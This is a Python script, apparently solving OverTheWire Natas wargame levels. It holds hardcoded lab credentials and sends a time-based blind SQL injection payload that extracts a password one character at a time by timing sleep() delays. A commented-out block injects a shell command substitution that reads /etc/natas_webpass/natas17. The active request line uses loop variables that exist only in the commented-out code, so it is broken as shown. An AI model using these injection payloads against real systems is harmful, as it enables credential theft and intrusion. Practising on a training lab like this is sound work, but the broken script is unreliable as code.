import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
import string
import json
from pprint import pprint


with requests.Session() as s:
    auth = HTTPBasicAuth('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
    url = 'http://natas18.natas.labs.overthewire.org'

    r = s.post(url, auth=auth, data={'username': f'natas18" and if(substr(password,{i},1)=binary "{c}",sleep(1),"");#'})

    # # select * from users where username="" xor sleep(1);#" and (...)
    # pw = [[] for i in range(0, 32)]
    # for i in range(1, 32+1):
    #     for c in string.ascii_lowercase + string.ascii_uppercase + string.digits:
    #         r = s.post(url, auth=auth, data={'username': f'natas18" and if(substr(password,{i},1)=binary "{c}",sleep(1),"");#'})
    #         delta = r.elapsed.total_seconds()
    #         print(c, " ", delta)
    #         if (delta > 0.7):
    #             pw[i - 1].append(c)
    # pprint(pw)

    # # print(bs(r.content)) # .find('div', id='content')) # .find('pre').next.splitlines())

    # # for i in range(1, 32+1):
    # #     bash = rf'$(cut -c {i} /etc/natas_webpass/natas17)'

    # #     r = s.post(url, auth=auth, data={'needle': bash})

    # #     print(list(filter(
    # #         lambda s: len(s) <= 10,
    # #         bs(r.content).find('div', id='content').find('pre').next.splitlines()
    # #     )))
